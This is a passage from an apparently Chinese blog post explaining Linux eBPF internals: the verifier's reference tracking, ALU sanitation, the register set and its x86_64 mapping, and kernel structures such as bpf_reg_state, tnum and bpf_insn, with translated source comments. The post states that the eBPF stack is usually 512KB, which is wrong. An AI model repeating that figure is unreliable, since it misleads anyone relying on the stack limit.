class="hljs-comment"> * - PTR_TO_SOCKET_OR_NULL, PTR_TO_SOCKET</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 当 verifier 遇到一个 helper 调用返回一个引用类型, </span><br><span class="hljs-comment"> * 其为该引用分配一个指针 id 并将他储存在当前的函数状态中.</span><br><span class="hljs-comment"> * 类似于将 PTR_TO_MAP_VALUE_OR_NULL 转化为 PTR_TO_MAP_VALUE 的方式，</span><br><span class="hljs-comment"> * 当类型通过一个 NULL-check 条件， PTR_TO_SOCKET_OR_NULL 变为 PTR_TO_SOCKET。</span><br><span class="hljs-comment"> * 对于状态变为 CONST_IMM 的分支，verifier会释放引用</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 对每个会分配一个引用的 helper 函数，例如 bpf_sk_lookup_tcp()，</span><br><span class="hljs-comment"> * 都有一个对应的释放函数，例如bpf_sk_release()。</span><br><span class="hljs-comment"> * 当一个引用类型传入释放函数时，verifier 同样释放引用。</span><br><span class="hljs-comment"> * 若在程序末尾仍保留有任何未检查或未释放的引用，verifier 会拒绝他</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h3 id="ALU-Sanitation"><a href="#ALU-Sanitation" class="headerlink" title="ALU Sanitation"></a>ALU Sanitation</h3><p><code>ALU Sanitation</code> 是 eBPF 中一个<strong>代码加固与运行时动态检测</strong>的框架，通过对程序正在处理的实际值进行运行时检查以弥补 verifier 静态分析的不足，这项技术通过调用 <code>fixup_bpf_calls()</code> <strong>为 eBPF 程序中的每一条指令的前面都添加上额外的辅助指令、替换部分指令</strong>等方式来实现</p><h2 id="三、eBPF-虚拟机"><a href="#三、eBPF-虚拟机" class="headerlink" title="三、eBPF 虚拟机"></a>三、eBPF 虚拟机</h2><p>eBPF 虚拟机本质上是 RISC 架构，一共有 11 个 64 位寄存器，一个程序计数器（PC）与一个固定大小的堆栈（通常为 512KB），在 x86 架构下的对应关系如下：</p><table><thead><tr><th align="center">eBPF 寄存器</th><th align="center">映射 x86_64 寄存器</th><th align="center">用途</th></tr></thead><tbody><tr><td align="center">R0</td><td align="center">rax</td><td align="center">函数返回值</td></tr><tr><td align="center">R1</td><td align="center">rdi</td><td align="center">argv1</td></tr><tr><td align="center">R2</td><td align="center">rsi</td><td align="center">argv2</td></tr><tr><td align="center">R3</td><td align="center">rdx</td><td align="center">argv3</td></tr><tr><td align="center">R4</td><td align="center">rcx</td><td align="center">argv4</td></tr><tr><td align="center">R5</td><td align="center">r8</td><td align="center">argv5</td></tr><tr><td align="center">R6</td><td align="center">rbx</td><td align="center">callee 保存</td></tr><tr><td align="center">R7</td><td align="center">r13</td><td align="center">callee 保存</td></tr><tr><td align="center">R8</td><td align="center">r14</td><td align="center">callee 保存</td></tr><tr><td align="center">R9</td><td align="center">r15</td><td align="center">callee 保存</td></tr><tr><td align="center">R10（只读）</td><td align="center">rbp</td><td align="center">堆栈指针寄存器</td></tr></tbody></table><p>r1 ~ r5 这五个寄存器用作 eBPF 中的函数调用传参，且只能保存常数或是指向堆栈的指针，因此所有的内存访问都需要先把数据加载到 eBPF 堆栈中才能使用，这种限制简化了 eBPF 的内存模型，也更方便 verifier 进行检查</p><p><img src="https://s2.loli.net/2023/05/28/68e53xiKbH4TQz7.png" alt="eBPF.png"></p><h3 id="bpf-reg-state-eBPF-寄存器状态"><a href="#bpf-reg-state-eBPF-寄存器状态" class="headerlink" title="bpf_reg_state - eBPF 寄存器状态"></a>bpf_reg_state - eBPF 寄存器状态</h3><p>在 eBPF 中，一个寄存器的状态信息使用 <code>bpf_reg_state</code> 进行表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> &#123;</span><br><span class="hljs-comment">/* 各字段的顺序是重要的.  参见 states_equal() */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-comment">/* 指针偏移的固定部分, 仅指针类型 */</span><br>s32 off;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* 当 type == PTR_TO_PACKET 时可用 */</span><br><span class="hljs-type">int</span> range;<br><br><span class="hljs-comment">/* 当 type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span><br><span class="hljs-comment"> *   PTR_TO_MAP_VALUE_OR_NULL 时可用</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map_ptr</span>;</span><br><span class="hljs-comment">/* 为了从外部映射中区分映射查找</span><br><span class="hljs-comment"> * map_uid 对于指向内部映射的寄存器为非 0 值</span><br><span class="hljs-comment"> */</span><br>u32 map_uid;<br>&#125;;<br><br><span class="hljs-comment">/* for PTR_TO_BTF_ID */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br>u32 btf_id;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* for PTR_TO_MEM | PTR_TO_MEM_OR_NULL */</span><br>u32 mem_size;<br>u32 dynptr_id; <span class="hljs-comment">/* for dynptr slices */</span><br>&#125;;<br><br><span class="hljs-comment">/* For dynptr stack slots */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_dynptr_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-comment">/* 一个 dynptr 为 16 字节， 故其占用 2 个 stack slots.</span><br><span class="hljs-comment"> * 我们需要追踪哪一个 slot 为第一个防止用户可能尝试传入一个从</span><br><span class="hljs-comment"> * dynptr 的第二个 slot 开始的地址的情况的 slot.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">bool</span> first_slot;<br>&#125; dynptr;<br><br><span class="hljs-comment">/* 以上任意一个的最大尺寸. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> raw1;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> raw2;<br>&#125; raw;<br><br>u32 subprogno; <span class="hljs-comment">/* for PTR_TO_FUNC */</span><br>&#125;;<br><span class="hljs-comment">/* 对于标量类型 (SCALAR_VALUE), 其表示我们对实际值的了解.</span><br><span class="hljs-comment"> * 对于指针类型, 其表示从被指向对象的偏移的可变部分，</span><br><span class="hljs-comment"> * 且同与我们有相同 id 的所有 bpf_reg_states 共享.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var_off</span>;</span><br><span class="hljs-comment">/* 被用于确定任何使用该寄存器的内存访问是否将导致一个坏的访问.</span><br><span class="hljs-comment"> * These refer to the same value as var_off, not necessarily the actual</span><br><span class="hljs-comment"> * contents of the register.</span><br><span class="hljs-comment"> */</span><br>s64 smin_value; <span class="hljs-comment">/* 最小可能值 (s64) */</span><br>s64 smax_value; <span class="hljs-comment">/* 最大可能值 (s64) */</span><br>u64 umin_value; <span class="hljs-comment">/* 最小可能值 (u64) */</span><br>u64 umax_value; <span class="hljs-comment">/* 最大可能值 (u64) */</span><br>s32 s32_min_value; <span class="hljs-comment">/* 最小可能值 (s32) */</span><br>s32 s32_max_value; <span class="hljs-comment">/* 最大可能值 (s32) */</span><br>u32 u32_min_value; <span class="hljs-comment">/* 最小可能值 (u32) */</span><br>u32 u32_max_value; <span class="hljs-comment">/* 最大可能值 (u32) */</span><br><span class="hljs-comment">/* 对于 PTR_TO_PACKET, 用以找到有着相同变量偏移的其他指针，</span><br><span class="hljs-comment"> * 由此他们可以共享范围信息.</span><br><span class="hljs-comment"> * 对于 PTR_TO_MAP_VALUE_OR_NULL 其被用于共享我们来自哪一个映射值</span><br><span class="hljs-comment"> * 当其一被测试于 != NULL.</span><br><span class="hljs-comment"> * 对于 PTR_TO_MEM_OR_NULL 其被用于辨识内存分配以追踪其释放.</span><br><span class="hljs-comment"> * 对于 PTR_TO_SOCKET 其被用于共享哪一个指针保留了对 socket 的相同引用，</span><br><span class="hljs-comment"> * 以确定合适的引用释放.</span><br><span class="hljs-comment"> * 对于作为 dynptrs 的 stack slots, 其被用于追踪对 dynptr的引用</span><br><span class="hljs-comment"> * 以确定合适的引用释放.</span><br><span class="hljs-comment"> */</span><br>u32 id;<br><span class="hljs-comment">/* PTR_TO_SOCKET 与 PTR_TO_TCP_SOCK 可以为一个返回自一个 pointer-cast helper</span><br><span class="hljs-comment"> * bpf_sk_fullsock() 与 bpf_tcp_sock() 的指针 .</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 考虑如下情况， &quot;sk&quot; 为一个返回自 &quot;sk = bpf_sk_lookup_tcp();&quot; 的引用计数指针:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 1: sk = bpf_sk_lookup_tcp();</span><br><span class="hljs-comment"> * 2: if (!sk) &#123; return 0; &#125;</span><br><span class="hljs-comment"> * 3: fullsock = bpf_sk_fullsock(sk);</span><br><span class="hljs-comment"> * 4: if (!fullsock) &#123; bpf_sk_release(sk); return 0; &#125;</span><br><span class="hljs-comment"> * 5: tp = bpf_tcp_sock(fullsock);</span><br><span class="hljs-comment"> * 6: if (!tp) &#123; bpf_sk_release(sk); return 0; &#125;</span><br><span class="hljs-comment"> * 7: bpf_sk_release(sk);</span><br><span class="hljs-comment"> * 8: snd_cwnd = tp-&gt;snd_cwnd;  // verifier 将抗议</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在第 7 行的 bpf_sk_release(sk) 之后, &quot;fullsock&quot; 指针与</span><br><span class="hljs-comment"> * &quot;tp&quot; 指针都应当被无效化.  为了这么做, 保存 &quot;fullsock&quot; 与 &quot;sk&quot;</span><br><span class="hljs-comment"> * 的寄存器需要记住在 ref_obj_id 中的原始引用计数指针 id(即， sk_reg-&gt;id)</span><br><span class="hljs-comment"> * 这样 verifier 便能重置所有 ref_obj_id 匹配 sk_reg-&gt;id 的寄存器</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * sk_reg-&gt;ref_obj_id 在第 1 行被设为 sk_reg-&gt;id.</span><br><span class="hljs-comment"> * sk_reg-&gt;id 将仅作为 NULL-marking 的目的保持.</span><br><span class="hljs-comment"> * 在 NULL-marking 完成后, sk_reg-&gt;id 可以被重置为 0.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在第 3 行的 &quot;fullsock = bpf_sk_fullsock(sk);&quot; 之后,</span><br><span class="hljs-comment"> * fullsock_reg-&gt;ref_obj_id 被设为 sk_reg-&gt;ref_obj_id.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在第 5 行的 &quot;tp = bpf_tcp_sock(fullsock);&quot; 之后,</span><br><span class="hljs-comment"> * tp_reg-&gt;ref_obj_id 被设为 fullsock_reg-&gt;ref_obj_id</span><br><span class="hljs-comment"> * 与 sk_reg-&gt;ref_obj_id 一致.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 从 verifier 的角度而言, 若 sk, fullsock 与 tp 都非 NULL,</span><br><span class="hljs-comment"> * 他们为有着不同 reg-&gt;type 的相同指针.</span><br><span class="hljs-comment"> * 特别地, bpf_sk_release(tp) 也被允许且有着与 bpf_sk_release(sk) </span><br><span class="hljs-comment"> * 相同的影响.</span><br><span class="hljs-comment"> */</span><br>u32 ref_obj_id;<br><span class="hljs-comment">/* 用于存活检查的亲子链 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">parent</span>;</span><br><span class="hljs-comment">/* 在被调用方中两个寄存器可以同时为 PTR_TO_STACK 如同 R1=fp-8 与 R2=fp-8,</span><br><span class="hljs-comment"> * 但其一指向该函数栈而另一指向调用方的栈. 为了区分他们 &#x27;frameno&#x27; 被使用，</span><br><span class="hljs-comment"> * 其为一个指向 bpf_func_state 的 bpf_verifier_state-&gt;frame[] 数组中的下标.</span><br><span class="hljs-comment"> */</span><br>u32 frameno;<br><span class="hljs-comment">/* 追踪子寄存器（subreg）定义. 保存的值为写入 insn 的 insn_idx.</span><br><span class="hljs-comment"> * 这是安全的因为 subreg_def 在任何仅在主校验结束后发生的 insn 修补前被使用.</span><br><span class="hljs-comment"> */</span><br>s32 subreg_def;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_liveness</span> <span class="hljs-title">live</span>;</span><br><span class="hljs-comment">/* if (!precise &amp;&amp; SCALAR_VALUE) min/max/tnum don&#x27;t affect safety */</span><br><span class="hljs-type">bool</span> precise;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="寄存器运行时值与边界范围校验"><a href="#寄存器运行时值与边界范围校验" class="headerlink" title="寄存器运行时值与边界范围校验"></a>寄存器运行时值与边界范围校验</h4><p>eBPF 程序的安全主要是由 verifier 保证的，verifier 会<strong>模拟执行每一条指令</strong>并验证寄存器的值是否合法，主要关注这几个字段：</p><ul><li><code>smin_value</code>、<code>smax_value</code>： 64 位有符号的值的可能取值边界</li><li><code>umin_value</code>、<code>umax_value</code>：64 位无符号的值的可能取值边界</li><li><code>s32_min_value</code>、<code>s32_max_value</code>：32 位有符号的值的可能取值边界</li><li><code>u32_min_value</code>、<code>u32_max_value</code>：32 位无符号的值的可能取值边界</li></ul><p>而寄存器中<strong>可以确定的值</strong>实际上通过 <code>var_off</code> 字段进行表示，该值用一个 <code>tnum</code> 结构体表示，<strong>mask 中为 0 对应的 value 位为已知位</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> &#123;</span><br>u64 value;<br>u64 mask;<br>&#125;;<br></code></pre></td></tr></table></figure><p>一个 verifier 完全未知的寄存器如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">tnum_unknown</span> =</span> &#123; .value = <span class="hljs-number">0</span>, .mask = <span class="hljs-number">-1</span> &#125;;<br></code></pre></td></tr></table></figure><blockquote><p>需要注意的是寄存器边界值是 verifier 通过模拟执行推测出来的，<strong>运行时的寄存器值不一定与 verifier 所推测的一致</strong>，这也曾是很多 eBPF 漏洞产生的原因</p></blockquote><h4 id="寄存器类型"><a href="#寄存器类型" class="headerlink" title="寄存器类型"></a>寄存器类型</h4><p>寄存器在程序运行的不同阶段可能存放着不同类型的值，verifier 通过跟踪寄存器值的类型来防止越界访问的发生，主要有三类：</p><ul><li>未初始化（not init）：寄存器的初始状态，尚未经过任何赋值操作，此类寄存器不能参与运算</li><li>标量值（scalar）：该寄存器被赋予了整型值，此类寄存器不能被作为指针进行内存访问</li><li>指针类型（pointer）：该寄存器为一个指针，verifier 会检查内存访问是否超出指针允许的范围<ul><li>实际上 eBPF 按照用途的不同划分多个不同的指针类型，例如指向栈的指针为 <code>PTR_TO_STACK</code> 类型</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* types of values stored in eBPF registers */</span><br><span class="hljs-comment">/* Pointer types represent:</span><br><span class="hljs-comment"> * pointer</span><br><span class="hljs-comment"> * pointer + imm</span><br><span class="hljs-comment"> * pointer + (u16) var</span><br><span class="hljs-comment"> * pointer + (u16) var + imm</span><br><span class="hljs-comment"> * if (range &gt; 0) then [ptr, ptr + range - off) is safe to access</span><br><span class="hljs-comment"> * if (id &gt; 0) means that some &#x27;var&#x27; was added</span><br><span class="hljs-comment"> * if (off &gt; 0) means that &#x27;imm&#x27; was added</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_type</span> &#123;</span><br>NOT_INIT = <span class="hljs-number">0</span>, <span class="hljs-comment">/* nothing was written into register */</span><br>SCALAR_VALUE, <span class="hljs-comment">/* reg doesn&#x27;t contain a valid pointer */</span><br>PTR_TO_CTX, <span class="hljs-comment">/* reg points to bpf_context */</span><br>CONST_PTR_TO_MAP, <span class="hljs-comment">/* reg points to struct bpf_map */</span><br>PTR_TO_MAP_VALUE, <span class="hljs-comment">/* reg points to map element value */</span><br>PTR_TO_MAP_VALUE_OR_NULL,<span class="hljs-comment">/* points to map elem value or NULL */</span><br>PTR_TO_STACK, <span class="hljs-comment">/* reg == frame_pointer + offset */</span><br>PTR_TO_PACKET_META, <span class="hljs-comment">/* skb-&gt;data - meta_len */</span><br>PTR_TO_PACKET, <span class="hljs-comment">/* reg points to skb-&gt;data */</span><br>PTR_TO_PACKET_END, <span class="hljs-comment">/* skb-&gt;data + headlen */</span><br>PTR_TO_FLOW_KEYS, <span class="hljs-comment">/* reg points to bpf_flow_keys */</span><br>PTR_TO_SOCKET, <span class="hljs-comment">/* reg points to struct bpf_sock */</span><br>PTR_TO_SOCKET_OR_NULL, <span class="hljs-comment">/* reg points to struct bpf_sock or NULL */</span><br>PTR_TO_SOCK_COMMON, <span class="hljs-comment">/* reg points to sock_common */</span><br>PTR_TO_SOCK_COMMON_OR_NULL, <span class="hljs-comment">/* reg points to sock_common or NULL */</span><br>PTR_TO_TCP_SOCK, <span class="hljs-comment">/* reg points to struct tcp_sock */</span><br>PTR_TO_TCP_SOCK_OR_NULL, <span class="hljs-comment">/* reg points to struct tcp_sock or NULL */</span><br>PTR_TO_TP_BUFFER, <span class="hljs-comment">/* reg points to a writable raw tp&#x27;s buffer */</span><br>PTR_TO_XDP_SOCK, <span class="hljs-comment">/* reg points to struct xdp_sock */</span><br><span class="hljs-comment">/* PTR_TO_BTF_ID points to a kernel struct that does not need</span><br><span class="hljs-comment"> * to be null checked by the BPF program. This does not imply the</span><br><span class="hljs-comment"> * pointer is _not_ null and in practice this can easily be a null</span><br><span class="hljs-comment"> * pointer when reading pointer chains. The assumption is program</span><br><span class="hljs-comment"> * context will handle null pointer dereference typically via fault</span><br><span class="hljs-comment"> * handling. The verifier must keep this in mind and can make no</span><br><span class="hljs-comment"> * assumptions about null or non-null when doing branch analysis.</span><br><span class="hljs-comment"> * Further, when passed into helpers the helpers can not, without</span><br><span class="hljs-comment"> * additional context, assume the value is non-null.</span><br><span class="hljs-comment"> */</span><br>PTR_TO_BTF_ID,<br><span class="hljs-comment">/* PTR_TO_BTF_ID_OR_NULL points to a kernel struct that has not</span><br><span class="hljs-comment"> * been checked for null. Used primarily to inform the verifier</span><br><span class="hljs-comment"> * an explicit null check is required for this struct.</span><br><span class="hljs-comment"> */</span><br>PTR_TO_BTF_ID_OR_NULL,<br>PTR_TO_MEM, <span class="hljs-comment">/* reg points to valid memory region */</span><br>PTR_TO_MEM_OR_NULL, <span class="hljs-comment">/* reg points to valid memory region or NULL */</span><br>PTR_TO_RDONLY_BUF, <span class="hljs-comment">/* reg points to a readonly buffer */</span><br>PTR_TO_RDONLY_BUF_OR_NULL, <span class="hljs-comment">/* reg points to a readonly buffer or NULL */</span><br>PTR_TO_RDWR_BUF, <span class="hljs-comment">/* reg points to a read/write buffer */</span><br>PTR_TO_RDWR_BUF_OR_NULL, <span class="hljs-comment">/* reg points to a read/write buffer or NULL */</span><br>PTR_TO_PERCPU_BTF_ID, <span class="hljs-comment">/* reg points to a percpu kernel variable */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="四、eBPF-指令与-eBPF-程序"><a href="#四、eBPF-指令与-eBPF-程序" class="headerlink" title="四、eBPF 指令与 eBPF 程序"></a>四、eBPF 指令与 eBPF 程序</h2><p>eBPF 为 RISC 指令集，单条 eBPF 指令在内核中定义为一个 <code>bpf_insn</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> &#123;</span><br>__u8code;<span class="hljs-comment">/* opcode */</span><br>__u8dst_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* dest register */</span><br>__u8src_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* source register */</span><br>__s16off;<span class="hljs-comment">/* signed offset */</span><br>__s32imm;<span class="hljs-comment">/* signed immediate constant */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>相应地，一个最简单的 eBPF 程序<strong>便是一个</strong> <code>bpf_insn</code> <strong>结构体数组</strong>，我们可以直接在用户态下编写形如这样的结构体数组来描述一个 eBPF 程序，并作为 eBPF 程序字节码传入内核：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span><br><span class="hljs-meta">    ((struct bpf_insn) &#123;                                \</span><br><span class="hljs-meta">        .code        = CODE,                            \</span><br><span class="hljs-meta">        .dst_reg     = DST,                             \</span><br><span class="hljs-meta">        .src_reg     = SRC,                             \</span><br><span class="hljs-meta">        .off         = OFF,                             \</span><br><span class="hljs-meta">        .imm         = IMM                              \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">test_bpf_prog</span>[] =</span> &#123;<br>    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x114514</span>),<br>    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>&#125;;<br></code></pre></td></tr></table></figure><p>载入到内核中后，内核最终会使用一个 <code>bpf_prog</code> 结构体来表示一个 eBPF 程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog</span> &#123;</span><br>u16pages;<span class="hljs-comment">/* 分配的页面数量 */</span><br>u16jited:<span class="hljs-number">1</span>,<span class="hljs-comment">/* 我们的 filter 是否是即时编译的? */</span><br>jit_requested:<span class="hljs-number">1</span>,<span class="hljs-comment">/* 架构需要即时编译程序 */</span><br>gpl_compatible:<span class="hljs-number">1</span>, <span class="hljs-comment">/* filter 是否兼容 GPL? */</span><br>cb_access:<span class="hljs-number">1</span>,<span class="hljs-comment">/* 控制块被访问了吗? */</span><br>dst_needed:<span class="hljs-number">1</span>,<span class="hljs-comment">/* 我们是否需要 dst 入口? */</span><br>blinding_requested:<span class="hljs-number">1</span>, <span class="hljs-comment">/* needs constant blinding */</span><span class="hljs-comment">//译注：不知道咋翻</span><br>blinded:<span class="hljs-number">1</span>,<span class="hljs-comment">/* Was blinded */</span><span class="hljs-comment">//译注：瞎了？</span><br>is_func:<span class="hljs-number">1</span>,<span class="hljs-comment">/* 程序为一个 bpf 函数 */</span><br>kprobe_override:<span class="hljs-number">1</span>, <span class="hljs-comment">/* 我们是否在一个 kprobe 之上? */</span><br>has_callchain_buf:<span class="hljs-number">1</span>, <span class="hljs-comment">/* callchain buffer 分配了吗? */</span><br>enforce_expected_attach_type:<span class="hljs-number">1</span>, <span class="hljs-comment">/* 在 attach 时强制执行 expected_attach_type 检查 */</span><br>call_get_stack:<span class="hljs-number">1</span>, <span class="hljs-comment">/* 我们是否调用 bpf_get_stack() 或 bpf_get_stackid() */</span><br>call_get_func_ip:<span class="hljs-number">1</span>, <span class="hljs-comment">/* 我们是否调用 get_func_ip() */</span><br>tstamp_type_access:<span class="hljs-number">1</span>; <span class="hljs-comment">/* 被访问的 __sk_buff-&gt;tstamp_type */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span><span class="hljs-title">type</span>;</span><span class="hljs-comment">/* BPF 程序类型 */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span 